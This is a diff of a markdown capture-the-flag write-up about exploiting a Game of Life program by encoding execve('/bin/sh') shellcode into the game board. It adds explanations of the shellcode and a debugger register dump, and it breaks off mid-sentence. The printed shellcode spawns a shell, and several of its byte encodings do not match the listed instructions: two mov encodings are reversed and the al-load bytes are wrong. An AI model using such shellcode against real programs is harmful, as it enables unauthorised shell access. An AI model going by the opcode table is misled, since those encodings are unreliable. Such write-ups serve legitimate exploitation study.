@@ -59,19 +59,37 @@ While running it locally, a `Segmentation fault (core dumped)` was reported. The
 (TBD)
 
 ### Solution
-To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following shellcode,
+To solve this challenge I decided to construct an initial Game of Life board such that the final board would contain assembly code that when executed would provide an interactive shell to the client. I started with the following execve shellcode,
 
 ```assembly
-xor    %eax,%eax        "\x31\xC0"
-push   %eax             "\x50"
-push   $0x68732f2f      "\x68\x2F\x2F\x73\x68"
-push   $0x6e69622f      "\x68\x2F\x62\x69\x6E"
-mov    %esp,%ebx        "\x89\xDC"
-push   %eax             "\x50"
-push   %ebx             "\x53"
-mov    %esp,%ecx        "\x89\xCC"
-mov    $0xb,%al         "\xA2\x00\x00\x00\x00"
-int    $0x80            "\xCD\x80"     
+xor    %eax,%eax        ; "\x31\xC0"
+push   %eax             ; "\x50"
+push   $0x68732f2f      ; "\x68\x2F\x2F\x73\x68"
+push   $0x6e69622f      ; "\x68\x2F\x62\x69\x6E"
+mov    %esp,%ebx        ; "\x89\xDC"
+push   %eax             ; "\x50"
+push   %ebx             ; "\x53"
+mov    %esp,%ecx        ; "\x89\xCC"
+mov    $0xb,%al         ; "\xA2\x00\x00\x00\x00"
+int    $0x80            ; "\xCD\x80"     
 ```
+This shellcode accomplishes the following,
+1. Sets eax to 0 and then pushes the value on the stack to Null-terminate the execution string
+2. Pushes the string "/bin/sh" on the stack
+3. Moves the address of the string to ebx
+4. Pushes eax on the stack again (still 0) in order to Null-terminate the char* array 
 
 I decided to attempt to encode the shellcode using only still life constructions. This would ensure that the entire construction would remain at the end of the 15 iterations. At 22 bytes, the binary encoding of this shellcode would eventually wrap around the 110 bits of the first line of the game board. The issue with wrapping is that it complicates the intial Game of Life construction and most likely would result in destabilizing it. Therefore, I decided to try and reduce the size of the shellcode to only 13 bytes. 
+
+By setting a breakpoint at `0xf661e000`, the address of the game board, I would be able to determine the state of the registers and stack prior to executing the shellcode. The result was the following
+
+``` assembly
+eax     0x0
+ecx     0x0
+edx     0x1
+ebx     0xf67c7000    ; last coordinate address
+esp     0xf6ffb6cc
+eip     0xf661e000
+```
+
+Based on those register settings I could 
